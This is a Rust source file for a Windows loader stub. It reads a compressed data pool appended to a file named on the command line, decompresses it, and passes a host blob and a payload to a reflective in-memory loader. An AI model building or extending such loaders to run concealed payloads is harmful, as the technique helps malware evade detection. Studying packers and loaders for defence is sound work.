#![allow(unsafe_op_in_unsafe_fn)]
use crate::META;
use std::ptr::null_mut;

use windows_sys::Win32::Foundation::*;
use windows_sys::Win32::Storage::FileSystem::*;

type RunPayloadFunc = unsafe extern "C" fn(*const u8, usize) -> u32;

use windows_sys::Win32::System::Environment::GetCommandLineW;
use windows_sys::Win32::UI::Shell::CommandLineToArgvW;

// Using the rust_eh_personality already provided by rusticated's lib.rs

pub unsafe fn get_module_file_name() -> Vec<u16> {
    let mut num_args = 0;
    let argv = CommandLineToArgvW(GetCommandLineW(), &mut num_args);
    if argv == core::ptr::null_mut() {
        std::process::exit(101);
    }
    if num_args < 2 {
        std::process::exit(102);
    }

    let arg1_ptr = *argv.offset(1);
    let mut len = 0;
    while *arg1_ptr.offset(len) != 0 {
        len += 1;
    }

    let mut wide_path = vec![0u16; (len + 1) as usize];
    core::ptr::copy_nonoverlapping(arg1_ptr, wide_path.as_mut_ptr(), len as usize);
    wide_path[len as usize] = 0;

    wide_path
}

pub unsafe fn run() {
    let wide_path = get_module_file_name();

    let handle = CreateFileW(
        wide_path.as_ptr(),
        FILE_READ_ATTRIBUTES | FILE_READ_DATA,
        FILE_SHARE_READ,
        core::ptr::null(),
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        core::ptr::null_mut(),
    );

    if handle == INVALID_HANDLE_VALUE {
        std::process::exit(2);
    }

    let mut file_size: i64 = 0;
    if GetFileSizeEx(handle, &mut file_size) == 0 {
        std::process::exit(3);
    }

    let pool_len = META.pool_len as usize;
    if pool_len == 0 {
        std::process::exit(4);
    }

    if file_size < pool_len as i64 {
        std::process::exit(5);
    }

    let mut distance: i64 = 0;
    if SetFilePointerEx(
        handle,
        file_size - pool_len as i64,
        &mut distance,
        FILE_BEGIN,
    ) == 0
    {
        std::process::exit(6);
    }

    let mut compressed_data = vec![0u8; pool_len];
    let _read_bytes: u32 = 0;

    // Read the pool entirely
    let mut total_read = 0;
    while total_read < pool_len {
        let mut n: u32 = 0;
        let to_read = core::cmp::min(pool_len - total_read, 0xFFFFFFFF) as u32;
        if ReadFile(
            handle,
            compressed_data.as_mut_ptr().add(total_read) as *mut _,
            to_read,
            &mut n,
            null_mut(),
        ) == 0
        {
            std::process::exit(7);
        }
        if n == 0 {
            std::process::exit(8);
        }
        total_read += n as usize;
    }
    CloseHandle(handle);

    let total_pool = META.payload_offset + META.payload_len;
    let mut decompressed_pool = vec![0u8; total_pool as usize];

    let mut out_offset = 0;
    let _ = crate::decompress::decompress_to_writer(&compressed_data, |chunk| {
        let end = out_offset + chunk.len();
        if end <= decompressed_pool.len() {
            decompressed_pool[out_offset..end].copy_from_slice(chunk);
            out_offset = end;
        }
    });

    let washmhost_data = &decompressed_pool
        [META.washmhost_offset as usize..(META.washmhost_offset + META.washmhost_len) as usize];
    let payload_data = &decompressed_pool
        [META.payload_offset as usize..(META.payload_offset + META.payload_len) as usize];

    crate::load_win::reflective_load_and_run(washmhost_data, payload_data);
}
